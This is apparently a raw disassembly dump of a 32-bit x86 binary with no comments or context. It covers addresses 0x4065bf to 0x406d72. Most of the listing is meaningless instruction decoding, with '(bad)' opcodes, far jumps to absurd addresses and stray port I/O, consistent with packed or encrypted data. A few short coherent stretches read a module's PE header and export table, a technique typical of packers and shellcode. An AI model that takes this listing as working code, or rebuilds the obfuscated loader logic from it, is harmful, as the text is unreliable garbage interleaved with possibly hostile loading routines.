  4065bf:	jp     0x406607
  4065c1:	out    dx,eax
  4065c2:	lods   eax,DWORD PTR ds:[esi]
  4065c3:	stos   BYTE PTR es:[edi],al
  4065c4:	call   0xebf43e50
  4065c9:	jmp    FWORD PTR [ebx-0x3cd6e865]
  4065cf:	mov    ds:0xcea2690b,al
  4065d4:	loopne 0x406570
  4065d6:	xor    esi,DWORD PTR [eax+0x60526131]
  4065dc:	rcl    DWORD PTR [ebx],0x47
  4065df:	xchg   DWORD PTR [ecx-0x6de1c1b2],eax
  4065e5:	xchg   ebx,eax
  4065e6:	mov    esp,0x898b8c0c
  4065eb:	mov    esp,0x93f400ab
  4065f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f1:	sub    dl,BYTE PTR [edx-0x38]
  4065f4:	adc    al,0xfa
  4065f6:	add    al,0x4d
  4065f8:	lds    esp,FWORD PTR [ebx]
  4065fa:	jb     0x406633
  4065fc:	mov    al,ds:0x2c155674
  406601:	test   al,0x4c
  406603:	add    DWORD PTR [edi-0x4e],esi
  406606:	and    edx,DWORD PTR [edx+0x104ba5fc]
  40660c:	xchg   ebx,eax
  40660d:	imul   esp,DWORD PTR [ebx],0xa2e9e879
  406613:	test   DWORD PTR [esi-0x64],0x268a296a
  40661a:	sbb    BYTE PTR [esi-0x7ac55f1f],0x6
  406621:	ins    DWORD PTR es:[edi],dx
  406622:	shr    al,0xa1
  406625:	xor    ch,dl
  406627:	push   ebx
  406628:	adc    BYTE PTR [esp+ebp*1+0x58248e53],ch
  40662f:	cmp    edx,DWORD PTR [ecx+0x51aa50d9]
  406635:	inc    esp
  406636:	xor    esp,DWORD PTR [eax]
  406638:	pop    edx
  406639:	inc    ebx
  40663a:	cmp    BYTE PTR [esi-0x32],0xd4
  40663e:	nop
  40663f:	sbb    DWORD PTR [eax],eax
  406641:	jbe    0x4065f5
  406643:	dec    ebx
  406644:	mov    bl,0x5e
  406646:	adc    ebx,DWORD PTR [esi]
  406648:	dec    esp
  406649:	pop    ebp
  40664a:	outs   dx,BYTE PTR ds:[esi]
  40664b:	xchg   edx,eax
  40664c:	and    dl,0x20
  40664f:	aas    
  406650:	loopne 0x4065d4
  406652:	aam    0xef
  406654:	(bad)  
  406655:	cld    
  406656:	pop    es
  406657:	mov    esi,esi
  406659:	loop   0x4066d5
  40665b:	pop    esi
  40665c:	pop    ebx
  40665d:	pop    edi
  40665e:	mov    DWORD PTR [eax+0x4c2698b5],esi
  406664:	arpl   WORD PTR [ebx+edi*4],cx
  406667:	cmp    ch,BYTE PTR [edx]
  406669:	jmp    0x406677
  40666b:	inc    ebp
  40666c:	int    0x28
  40666e:	sti    
  40666f:	add    eax,0xab5e23f3
  406674:	inc    eax
  406675:	sub    eax,0x538b5145
  40667a:	add    al,0x35
  40667c:	ja     0x406633
  40667e:	jns    0x40664b
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0x2164920c
  4066b2:	iret   
  4066b3:	nop
  4066b4:	mov    esi,0xbdbebe3b
  4066b9:	les    edi,FWORD PTR [esi+0x16580be]
  4066bf:	les    eax,FWORD PTR [edx-0x61]
  4066c2:	loopne 0x406648
  4066c4:	cmp    BYTE PTR [edi-0x67],0xc8
  4066c8:	mov    al,ds:0xd12a6fc1
  4066cd:	sbb    al,0xad
  4066cf:	pusha  
  4066d0:	jo     0x4066ee
  4066d2:	lods   eax,DWORD PTR ds:[esi]
  4066d3:	mov    ds:0xa8623be7,eax
  4066d8:	aad    0xde
  4066da:	cli    
  4066db:	call   0x95fa4ccc
  4066e0:	pop    esp
  4066e1:	push   ds
  4066e2:	fsubp  st(0),st
  4066e4:	arpl   WORD PTR [ecx-0x66],sp
  4066e7:	repnz sbb BYTE PTR [ecx-0x7b],ah
  4066eb:	int3   
  4066ec:	sub    eax,0x6b48e36b
  4066f1:	dec    edi
  4066f2:	xor    ecx,DWORD PTR [edi-0x5a617c27]
  4066f8:	inc    ebp
  4066f9:	mov    ds,WORD PTR [ecx-0x6d21b0ea]
  4066ff:	cmc    
  406700:	cmc    
  406701:	mov    al,0x52
  406703:	and    DWORD PTR [esi+0x6a],eax
  406706:	push   ds
  406707:	mov    dh,dl
  406709:	mov    eax,ds:0xe98ba73a
  40670e:	fs inc esi
  406710:	xor    bh,BYTE PTR [edi-0x62b1af68]
  406716:	jo     0x406739
  406718:	jmp    DWORD PTR [edx]
  40671a:	adc    bh,BYTE PTR [eax-0x7b8de987]
  406720:	cmp    eax,0xe5d383ec
  406725:	jno    0x406764
  406727:	mov    dh,0xf1
  406729:	lock hlt 
  40672b:	push   ss
  40672c:	dec    edx
  40672d:	sbb    esi,esp
  40672f:	test   ax,0xbc2d
  406733:	mov    ds:0xa52be27d,eax
  406738:	xlat   BYTE PTR ds:[ebx]
  406739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40673a:	push   es
  40673b:	sub    cl,BYTE PTR [edx+0x31]
  40673e:	push   esp
  40673f:	pop    ecx
  406740:	jo     0x40676c
  406742:	fs jp  0x4067a3
  406745:	push   ecx
  406746:	push   ebx
  406747:	xchg   ebx,eax
  406748:	and    BYTE PTR [esi-0x63],ch
  40674b:	sbb    BYTE PTR [edx-0x57],bh
  40674e:	add    ch,BYTE PTR [ebx]
  406750:	pop    edx
  406751:	and    al,0x67
  406753:	inc    ebp
  406754:	pop    ecx
  406755:	add    BYTE PTR [edi-0x5b],ah
  406758:	outs   dx,BYTE PTR ds:[esi]
  406759:	dec    edx
  40675a:	mov    esp,0xf378db14
  40675f:	ror    BYTE PTR [edx+0x1c],1
  406762:	dec    ebx
  406763:	jb     0x40670b
  406765:	adc    ebx,edx
  406767:	jmp    0x1e0a:0xbfdfc256
  40676e:	lahf   
  40676f:	dec    dl
  406771:	xchg   edi,eax
  406772:	out    dx,al
  406773:	jns    0x4067a5
  406775:	dec    ebx
  406776:	call   0x75696c21
  40677b:	pusha  
  40677c:	cwde   
  40677d:	jle    0x406751
  40677f:	adc    eax,0xce0a4552
  406784:	mov    eax,0x404b1f5e
  406789:	sub    BYTE PTR [ebx*8-0x252a9095],cl
  406790:	sahf   
  406791:	inc    ebx
  406792:	out    0x3e,eax
  406794:	jge    0x406771
  406796:	stc    
  406797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406798:	cdq    
  406799:	clc    
  40679a:	mov    cl,0x69
  40679c:	shl    DWORD PTR [ebx+ecx*1],cl
  40679f:	clc    
  4067a0:	mov    esp,DWORD PTR [edi]
  4067a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067a3:	fs cmp al,0x2
  4067a6:	jne    0x406791
  4067a8:	add    cl,BYTE PTR [eax+0x5d]
  4067ab:	inc    ebp
  4067ac:	xor    dl,al
  4067ae:	adc    ch,BYTE PTR [edx-0x19b300f5]
  4067b4:	(bad)  
  4067b5:	gs sbb eax,0xabf2c6c2
  4067bb:	xchg   ecx,eax
  4067bc:	sub    ebp,edx
  4067be:	inc    DWORD PTR [esi]
  4067c0:	xchg   ebx,eax
  4067c1:	iret   
  4067c2:	or     DWORD PTR [esi+0x3b36ee2c],ebp
  4067c8:	jg     0x406773
  4067ca:	imul   ebp,DWORD PTR [esi],0x2d
  4067cd:	xchg   ebx,eax
  4067ce:	pop    ebx
  4067cf:	dec    esi
  4067d0:	js     0x40676e
  4067d2:	mov    ebx,0x562f75f1
  4067d7:	fbstp  TBYTE PTR [edx+0x60fa31d3]
  4067dd:	gs int3 
  4067df:	inc    ebx
  4067e0:	mov    esi,0x91085722
  4067e5:	retf   0x5b36
  4067e8:	mov    ah,0xb3
  4067ea:	mov    ds:0xceb40f0b,al
  4067ef:	fstp   TBYTE PTR [ebx]
  4067f1:	or     eax,0xf735cd23
  4067f6:	lods   al,BYTE PTR ds:[esi]
  4067f7:	sbb    DWORD PTR es:[eax],edi
  4067fa:	addr16 fwait
  4067fc:	dec    ebx
  4067fd:	mov    WORD PTR [eax],?
  4067ff:	(bad)  
  406800:	(bad)  
  406801:	jg     0x406784
  406803:	sbb    al,0x38
  406805:	arpl   WORD PTR [eax+0x66],bx
  406808:	retf   
  406809:	mov    edx,0xf3247498
  40680e:	inc    edx
  40680f:	lds    edx,FWORD PTR [ebp-0x1]
  406812:	and    DWORD PTR [esi+0x7772a222],0x8db6f8e4
  40681c:	push   ebx
  40681d:	shl    DWORD PTR [ebx+0x2b],0x2e
  406821:	and    DWORD PTR [ebx+ebx*8],ecx
  406824:	cmp    DWORD PTR [ebx+ebx*1+0xb],eax
  406828:	dec    eax
  406829:	mov    ah,0xdf
  40682b:	fcom   QWORD PTR [ebx]
  40682d:	sti    
  40682e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40682f:	into   
  406830:	pop    ebp
  406831:	pop    eax
  406832:	loop   0x4067fb
  406834:	jg     0x406800
  406836:	dec    eax
  406837:	jno    0x406861
  406839:	sbb    dl,BYTE PTR [eax]
  40683b:	inc    eax
  40683c:	mov    eax,0x4021e967
  406841:	fwait
  406842:	jp     0x4067fb
  406844:	mov    ebp,0xc7914ae4
  406849:	je     0x406826
  40684b:	sti    
  40684c:	ins    DWORD PTR es:[edi],dx
  40684d:	jb     0x406891
  40684f:	mov    dl,0x58
  406851:	je     0x40689e
  406853:	mov    esp,0x238f79a0
  406858:	pop    edi
  406859:	cmc    
  40685a:	xchg   esp,eax
  40685b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40685c:	xchg   ebx,eax
  40685d:	pop    es
  40685e:	in     ax,0xd5
  406861:	mov    ah,BYTE PTR [edi-0x68]
  406864:	sub    ch,cl
  406866:	jne    0x406885
  406868:	sbb    eax,0xfe333a72
  40686d:	sbb    eax,0x2c1e8f7f
  406872:	jbe    0x4068a2
  406874:	clc    
  406875:	jo     0x406844
  406877:	cmp    dh,BYTE PTR [ebx]
  406879:	ins    BYTE PTR es:[edi],dx
  40687a:	sahf   
  40687b:	and    dl,BYTE PTR [esi-0x7e]
  40687e:	mov    BYTE PTR [ebp-0x15],bl
  406881:	retf   
  406882:	rcr    DWORD PTR [edi+0xf],0x15
  406886:	popa   
  406887:	or     eax,0x48c5c69
  40688c:	popa   
  40688d:	xor    ebx,DWORD PTR [ebp+0x6f]
  406890:	mov    al,ds:0x5f7c4c9c
  406895:	pop    edx
  406896:	jo     0x40684b
  406898:	sub    ecx,DWORD PTR [eax-0x2a]
  40689b:	test   eax,0xb054ff18
  4068a0:	jb     0x406888
  4068a2:	clc    
  4068a3:	mov    cl,0xc
  4068a5:	das    
  4068a6:	pop    esp
  4068a7:	mov    edi,0x46dd9f9a
  4068ac:	fwait
  4068ad:	repnz call FWORD PTR [edx]
  4068b0:	ret    
  4068b1:	aaa    
  4068b2:	dec    edi
  4068b3:	sbb    al,0x9f
  4068b5:	sbb    al,0x6e
  4068b7:	lds    ecx,FWORD PTR [edi-0x13db00f0]
  4068bd:	pusha  
  4068be:	or     BYTE PTR [eax-0x289d215f],ah
  4068c4:	xchg   BYTE PTR [edx],al
  4068c6:	and    eax,0xf756b019
  4068cb:	and    bh,BYTE PTR [edx+ecx*2]
  4068ce:	dec    ecx
  4068cf:	jecxz  0x4068c0
  4068d1:	shl    DWORD PTR [ebp-0x754e0f3c],cl
  4068d7:	je     0x406925
  4068d9:	xchg   ebp,eax
  4068da:	fdivrp st(3),st
  4068dc:	(bad)  
  4068de:	mov    ecx,0xfb2c8e22
  4068e3:	jno    0x4068bd
  4068e5:	mov    ch,0xc3
  4068e7:	adc    eax,0x87bd09a6
  4068ec:	xor    eax,0x4c6c038
  4068f1:	dec    BYTE PTR [edx+0x6c]
  4068f4:	sub    al,0x9b
  4068f6:	cs icebp 
  4068f8:	fidivr DWORD PTR [eax]
  4068fa:	mov    ah,0xd2
  4068fc:	inc    edx
  4068fd:	xor    eax,0x3ab545f9
  406902:	jmp    0x4068ff
  406904:	in     eax,0x9f
  406906:	dec    eax
  406907:	aam    0x9a
  406909:	fadd   QWORD PTR [ebx+0x1a]
  40690c:	mov    gs,WORD PTR [ebx+ebx*2+0x324d6d08]
  406913:	mov    eax,0xb820ec31
  406918:	cld    
  406919:	pop    ds
  40691a:	pop    ebp
  40691b:	sbb    DWORD PTR [ebp+edx*2-0x66],edx
  40691f:	test   BYTE PTR [eax-0x20],0x4b
  406923:	test   eax,0x37f54384
  406928:	xor    al,0x68
  40692a:	inc    ebp
  40692b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40692c:	and    ebp,DWORD PTR [esi+0x4b]
  40692f:	push   esp
  406930:	pop    ss
  406931:	and    BYTE PTR [edi],bh
  406933:	or     dl,ch
  406935:	retf   
  406936:	xchg   BYTE PTR [edx+0x69],dh
  406939:	fucomi st,st(3)
  40693b:	nop
  40693c:	mov    cl,0xf1
  40693e:	mov    esp,ss
  406940:	jnp    0x406913
  406942:	lods   eax,DWORD PTR ds:[esi]
  406943:	fwait
  406944:	ja     0x4069a7
  406946:	adc    ecx,edx
  406948:	inc    esp
  406949:	ss js  0x4069b2
  40694c:	and    bl,cl
  40694e:	or     al,0xa8
  406950:	cmp    BYTE PTR [ebp+0x2da49f84],ch
  406956:	popa   
  406957:	sbb    BYTE PTR [ecx],al
  406959:	imul   eax,DWORD PTR [eax+0x49825af1],0xd
  406960:	xor    al,0x7d
  406962:	ja     0x406910
  406964:	xchg   DWORD PTR [edx-0x45fff514],eax
  40696a:	aaa    
  40696b:	jno    0x40698c
  40696d:	loop   0x4069bc
  40696f:	into   
  406970:	jl     0x406958
  406972:	lock xor eax,0x1aa8e81a
  406978:	fild   DWORD PTR [ecx]
  40697a:	mov    edi,0x79bc0836
  40697f:	inc    edx
  406980:	cmp    eax,0xb82d7fda
  406985:	xchg   BYTE PTR [edx+eiz*1],dh
  406988:	in     al,0x39
  40698a:	imul   ebp,DWORD PTR [ebx+ebx*1-0x80],0x34ea4f6
  406992:	into   
  406993:	inc    eax
  406994:	retf   
  406995:	or     DWORD PTR [esi-0x16e45b2b],eax
  40699b:	data16 in al,dx
  40699d:	arpl   WORD PTR [edx-0x39],bx
  4069a0:	mov    dl,0x82
  4069a2:	jmp    0x406974
  4069a4:	aaa    
  4069a5:	add    eax,0x7e4e6da1
  4069aa:	jb     0x40692c
  4069ac:	das    
  4069ad:	cli    
  4069ae:	jae    0x406948
  4069b0:	xor    al,0x45
  4069b2:	test   al,0xcd
  4069b4:	push   0x3fbdce42
  4069b9:	sub    DWORD PTR [esi+0x40773533],ebp
  4069bf:	mov    dh,0xcc
  4069c1:	jmp    0x77c5180d
  4069c6:	push   cs
  4069c7:	std    
  4069c8:	xchg   ecx,eax
  4069c9:	(bad)  
  4069ca:	hlt    
  4069cb:	or     DWORD PTR ds:0x2a6a0a38,0x55d5a8d8
  4069d5:	xchg   edx,eax
  4069d6:	daa    
  4069d7:	push   ds
  4069d8:	pop    esp
  4069d9:	pop    ds
  4069da:	jo     0x4069df
  4069dc:	xlat   BYTE PTR ds:[ebx]
  4069dd:	jmp    0xb80afdf5
  4069e2:	sbb    DWORD PTR [ebx-0x65],ecx
  4069e5:	mov    cl,0xad
  4069e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e8:	bound  ecx,QWORD PTR [edx+ecx*8]
  4069eb:	mov    eax,DWORD PTR [ecx+edx*1+0x5b89ae31]
  4069f2:	inc    ecx
  4069f3:	adc    DWORD PTR [ecx],edi
  4069f5:	test   BYTE PTR [ebx-0x12655ddb],cl
  4069fb:	dec    ebx
  4069fc:	mov    bh,0x3b
  4069fe:	mov    bl,0x25
  406a00:	jp     0x406a4d
  406a02:	enter  0xbce,0xec
  406a06:	push   ss
  406a07:	test   BYTE PTR ds:0x3319296f,dl
  406a0d:	or     ch,cl
  406a0f:	fdivr  DWORD PTR [ecx+0x5d]
  406a12:	lods   al,BYTE PTR ds:[esi]
  406a13:	push   cs
  406a14:	mov    dl,0xa
  406a16:	cmp    BYTE PTR [ecx-0x34],cl
  406a19:	jecxz  0x4069e0
  406a1b:	int3   
  406a1c:	aad    0x31
  406a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a1f:	test   DWORD PTR [ecx],edx
  406a21:	frstor [eax+0x55]
  406a24:	ins    DWORD PTR es:[edi],dx
  406a25:	fmul   st,st(3)
  406a27:	aam    0xd9
  406a29:	jne    0x4069b5
  406a2b:	mov    edx,cs
  406a2d:	adc    BYTE PTR [ebp-0x16],0xa6
  406a31:	call   0x5807:0x8fba13d7
  406a38:	(bad)  
  406a39:	add    esp,ebx
  406a3b:	fiadd  DWORD PTR [ebx-0x766acd34]
  406a41:	inc    ebp
  406a42:	xchg   esp,eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	scas   al,BYTE PTR es:[edi]
  406abe:	sub    ecx,ecx
  406ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ac1:	mov    ebp,0xbdbebe41
  406ac6:	les    edi,FWORD PTR [esi-0x6baa842]
  406acc:	xchg   ebx,eax
  406acd:	enter  0x7ed8,0x61
  406ad1:	pop    esp
  406ad2:	and    eax,0xcf15324b
  406ad7:	cmp    eax,0x9bfa847
  406adc:	jo     0x406abc
  406ade:	mov    ebp,0x16f3a517
  406ae3:	or     al,0x8f
  406ae5:	int3   
  406ae6:	dec    esi
  406ae7:	loopne 0x406b20
  406ae9:	int3   
  406aea:	sub    DWORD PTR [edx+0x4bea41ac],esp
  406af0:	mov    ah,0x45
  406af2:	ror    BYTE PTR [eax],1
  406af4:	jp     0x406b12
  406af6:	jp     0x406ac1
  406af8:	sub    al,0x4e
  406afa:	inc    edx
  406afb:	sbb    ebx,DWORD PTR ss:[ebx+0x21]
  406aff:	inc    edx
  406b00:	in     eax,dx
  406b01:	lods   al,BYTE PTR ds:[esi]
  406b02:	scas   eax,DWORD PTR es:[edi]
  406b03:	and    eax,0xf044934e
  406b08:	inc    edx
  406b09:	push   ds
  406b0a:	adc    eax,0xc4d69b89
  406b0f:	sbb    eax,0xb0b47c4
  406b14:	push   cs
  406b15:	frstor [edi+0x6aad9bf5]
  406b1b:	or     BYTE PTR [ebp+0x5f],dh
  406b1e:	xchg   esp,eax
  406b1f:	inc    esi
  406b20:	je     0x406b9e
  406b22:	or     al,0xf1
  406b24:	dec    edi
  406b25:	push   eax
  406b26:	pop    ebx
  406b27:	or     al,0x29
  406b29:	(bad)  
  406b2a:	not    BYTE PTR [esi+ebx*1]
  406b2d:	sub    ebx,DWORD PTR [eax]
  406b2f:	ret    0x933
  406b32:	mov    ch,0x10
  406b34:	pop    ecx
  406b35:	(bad)  
  406b36:	push   ss
  406b37:	mov    ds:0x7925ac02,al
  406b3c:	rcr    BYTE PTR [ebp+0x24a09de5],1
  406b42:	sub    eax,0x348c6bf2
  406b47:	push   ebx
  406b48:	pop    eax
  406b49:	add    BYTE PTR [edx+0x7f536358],al
  406b4f:	push   ecx
  406b50:	sub    edi,DWORD PTR [edi+0x7c]
  406b53:	in     eax,0x77
  406b55:	aas    
  406b56:	(bad)  [ebx]
  406b58:	(bad)  
  406b59:	mov    esi,0x3d5bf6aa
  406b5e:	push   ds
  406b5f:	mov    dl,0x87
  406b61:	rcr    BYTE PTR [edi+0x2a],0x4d
  406b65:	and    DWORD PTR [edi+0x7c2c8178],0x77994878
  406b6f:	mov    DWORD PTR [ebx+0x7a],edx
  406b72:	mov    bl,0x74
  406b74:	(bad)  
  406b75:	fsubr  QWORD PTR [edi+edi*1+0x6e]
  406b79:	and    BYTE PTR [ebx+0x4af5e2e5],0x38
  406b80:	push   esi
  406b81:	movsx  ebp,BYTE PTR [ecx-0x1bb05ac6]
  406b88:	dec    esi
  406b89:	sub    eax,DWORD PTR [ecx+0x1c2aed89]
  406b8f:	shr    BYTE PTR [ebx-0x59],cl
  406b92:	jmp    0x406b94
  406b94:	pop    esi
  406b95:	or     ah,0xd5
  406b98:	add    edx,0x46b1ab99
  406b9e:	jbe    0x406bb6
  406ba0:	ins    BYTE PTR es:[edi],dx
  406ba1:	pusha  
  406ba2:	outs   dx,BYTE PTR ds:[esi]
  406ba3:	fs icebp 
  406ba5:	in     eax,0xd9
  406ba7:	(bad)  
  406ba8:	data16 in al,0x7a
  406bab:	fistp  WORD PTR [ebx+0x3]
  406bae:	out    0x98,eax
  406bb0:	jmp    0x265e:0x624e1fdb
  406bb7:	mov    eax,ds:0x5a55af4c
  406bbc:	mov    ebp,DWORD PTR [edi]
  406bbe:	adc    eax,0xe7984f95
  406bc3:	sub    edx,ecx
  406bc5:	les    ebx,FWORD PTR ds:0x4a8b7b62
  406bcb:	adc    DWORD PTR ds:0xd5265a10,edx
  406bd1:	lods   al,BYTE PTR ds:[esi]
  406bd2:	xor    esp,DWORD PTR [ebx-0x47c7c5a8]
  406bd8:	cmp    al,0x54
  406bda:	cwde   
  406bdb:	cwde   
  406bdc:	mov    dl,0x63
  406bde:	div    DWORD PTR [ecx+0x67]
  406be1:	(bad)  
  406be3:	retf   0xb48c
  406be6:	hlt    
  406be7:	pop    ecx
  406be8:	or     BYTE PTR [edi],0x73
  406beb:	je     0x406b81
  406bed:	enter  0xe81d,0xc0
  406bf1:	mov    esi,DWORD PTR [ecx]
  406bf3:	xchg   ebx,eax
  406bf4:	cmp    BYTE PTR [ecx-0x3a40c58],dh
  406bfa:	fcom   DWORD PTR [edi+eax*2+0x22ac2c1f]
  406c01:	lds    ebx,FWORD PTR [ebp+0x4e]
  406c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c05:	cmp    DWORD PTR [edi+0x35],ecx
  406c08:	call   0x5f36:0xa5129eda
  406c0f:	dec    edx
  406c10:	call   0x9bde0200
  406c15:	sub    al,0xa
  406c17:	xor    bl,BYTE PTR [ebx+0x3a]
  406c1a:	imul   ebx,DWORD PTR [eax+0x6a4b360d],0xffffffe1
  406c21:	jmp    0xa5529763
  406c26:	sub    DWORD PTR [esi-0x76],ebp
  406c29:	sar    BYTE PTR [ecx-0x719d975a],cl
  406c2f:	stos   DWORD PTR es:[edi],eax
  406c30:	lds    ebp,FWORD PTR [eax]
  406c32:	fwait
  406c33:	outs   dx,DWORD PTR ds:[esi]
  406c34:	fmul   st(4),st
  406c36:	loope  0x406bd2
  406c38:	inc    ebp
  406c39:	(bad)  
  406c3a:	mov    ds:0xd54e9419,eax
  406c3f:	fdivr  QWORD PTR [ecx]
  406c41:	mov    ebx,0x494478bf
  406c46:	fld    TBYTE PTR [ebp-0x22]
  406c49:	lahf   
  406c4a:	adc    eax,0x2ccc6e60
  406c4f:	in     al,0xf5
  406c51:	adc    ch,dh
  406c53:	out    dx,al
  406c54:	int    0xac
  406c56:	mov    esp,DWORD PTR [edi]
  406c58:	leave  
  406c59:	or     DWORD PTR [edi+0x34],esp
  406c5c:	cmp    BYTE PTR [ebx+ebp*1-0x3d],cl
  406c60:	in     eax,dx
  406c61:	fs inc edx
  406c63:	(bad)  
  406c64:	loope  0x406c77
  406c66:	(bad)  
  406c67:	mov    BYTE PTR ds:0x8b5519ee,ch
  406c6d:	add    BYTE PTR [eax-0x2e],dh
  406c70:	repz add ecx,DWORD PTR [eax+0x5f0140ce]
  406c77:	scas   eax,DWORD PTR es:[edi]
  406c78:	sbb    eax,0x485ef9d5
  406c7d:	data16 jbe 0x406c98
  406c80:	call   0x636e:0x544f6c11
  406c87:	neg    BYTE PTR ds:0xc6f0d0c1
  406c8d:	inc    ebp
  406c8e:	aam    0x2f
  406c90:	fisttp DWORD PTR [ebp-0x394b8ea6]
  406c96:	or     DWORD PTR [ebx],esi
  406c98:	stos   BYTE PTR es:[edi],al
  406c99:	jmp    0x760cbf63
  406c9e:	lea    ebp,[ebx]
  406ca0:	inc    ebp
  406ca1:	sub    DWORD PTR [esi+ecx*1+0x40],0x59
  406ca6:	icebp  
  406ca7:	mov    ch,0x65
  406ca9:	adc    ebp,DWORD PTR [edx+0x12]
  406cac:	or     bl,ah
  406cae:	mov    bl,0xed
  406cb0:	pop    ebx
  406cb1:	dec    ebp
  406cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb3:	sbb    al,0xb2
  406cb5:	int    0x28
  406cb7:	dec    eax
  406cb8:	pop    ebx
  406cb9:	adc    DWORD PTR es:[edx-0x4c],ebx
  406cbd:	loopne 0x406cea
  406cbf:	dec    esi
  406cc0:	(bad)  
  406cc1:	mov    esp,0x4d830cef
  406cc6:	shl    DWORD PTR [edx],0x2a
  406cc9:	xchg   esp,eax
  406cca:	adc    BYTE PTR [eax+0x5d],dl
  406ccd:	sub    eax,0xe9ea9b7c
  406cd2:	fistp  QWORD PTR [ecx-0x66448505]
  406cd8:	cmp    esi,0xea32752a
  406cde:	scas   al,BYTE PTR es:[edi]
  406cdf:	cmp    al,0x43
  406ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce2:	mov    ?,esi
  406ce4:	mov    dh,0xff
  406ce6:	or     al,0xce
  406ce8:	push   ebp
  406ce9:	jg     0x406cd7
  406ceb:	rcl    BYTE PTR [ebx+ecx*4],1
  406cee:	jns    0x406d09
  406cf0:	pop    ecx
  406cf1:	cmp    cl,BYTE PTR [ecx+esi*2+0x48]
  406cf5:	lods   al,BYTE PTR ds:[esi]
  406cf6:	sub    al,0x65
  406cf8:	leave  
  406cf9:	mov    cs,WORD PTR [edx+0x6b]
  406cfc:	xor    al,0x51
  406cfe:	sbb    DWORD PTR ds:0x29f43be9,edi
  406d04:	cmp    al,dh
  406d06:	lock outs dx,DWORD PTR ds:[esi]
  406d08:	and    ecx,DWORD PTR [esi-0x26cde694]
  406d0e:	das    
  406d0f:	mov    ah,0x23
  406d11:	inc    ebx
  406d12:	(bad)  
  406d13:	lahf   
  406d14:	sbb    ch,BYTE PTR [edx]
  406d16:	(bad)  
  406d17:	out    dx,eax
  406d18:	sar    BYTE PTR [ebp+0x5c],1
  406d1b:	xor    eax,0xec9c3501
  406d20:	hlt    
  406d21:	rcl    DWORD PTR [edi],1
  406d23:	pop    ss
  406d24:	enter  0xbcd3,0xa5
  406d28:	cs dec ebp
  406d2a:	mov    ss,WORD PTR [ebx]
  406d2c:	xchg   edx,eax
  406d2d:	pop    ds
  406d2e:	add    ch,bh
  406d30:	in     al,0x99
  406d32:	xchg   BYTE PTR [esi+0x3b],dl
  406d35:	arpl   ax,dx
  406d37:	jmp    0x8604:0x14c5a36f
  406d3e:	retf   
  406d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d40:	xchg   ecx,eax
  406d41:	stos   BYTE PTR es:[edi],al
  406d42:	push   ss
  406d43:	out    0x35,al
  406d45:	push   eax
  406d46:	push   ecx
  406d47:	add    dl,dh
  406d49:	mov    al,0x3c
  406d4b:	add    DWORD PTR [edx-0x1fc673d6],0x75
  406d52:	popf   
  406d53:	mov    bh,0xe0
  406d55:	cs out dx,al
  406d57:	or     bh,BYTE PTR [ecx+0x1e]
  406d5a:	ficom  DWORD PTR [ecx+0x7c64ff74]
  406d60:	xlat   BYTE PTR ds:[ebx]
  406d61:	mov    al,ds:0x8c759ee3
  406d66:	mov    cl,0x72
  406d68:	or     edx,DWORD PTR [ebx+0x6d0078e6]
  406d6e:	retf   0x8aa4
  406d71:	pusha  
  406d72:	jne    0x406d2f
